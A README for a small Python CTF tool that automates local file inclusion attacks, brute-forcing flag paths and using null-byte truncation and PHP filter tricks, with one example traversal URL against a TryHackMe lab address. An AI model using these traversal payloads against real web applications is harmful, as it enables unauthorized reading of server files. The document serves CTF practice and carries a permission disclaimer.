# FlagSnatcher 🏁😎
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
Snatches flags from LFI vulnerable apps. Fast. Automated. No manual `../` guessing.
## Why FlagSnatcher?
I spent 2 hours manually trying `../../../../flag` on TryHackMe. Built this to never do that again.
## Features
- ✅ Auto bruteforces 20+ common flag paths
- ✅ Null byte `%00` truncation bypass
- ✅ PHP filter + Base64 auto-decode
- ✅ Clean output - shows flag only when found
- ✅ Built for CTF beginners

## Usage
```bash
python solver.py <TARGET_URL> <PARAM_NAME> <PREFIX>

*Example - THM DogCat Room:*

python solver.py http://10.49.182.104 view dog

Output

[+] FLAG FOUND with Null Byte!
[+] URL: http://10.49.182.104/?view=dog../../../flag.txt%00
[+] FLAG: THM{example_flag_here}

Disclaimer
For educational CTF use only. Test only on machines you have permission to attack.

*Built with 💪 by UZMA after a frustrating LFI session*


---

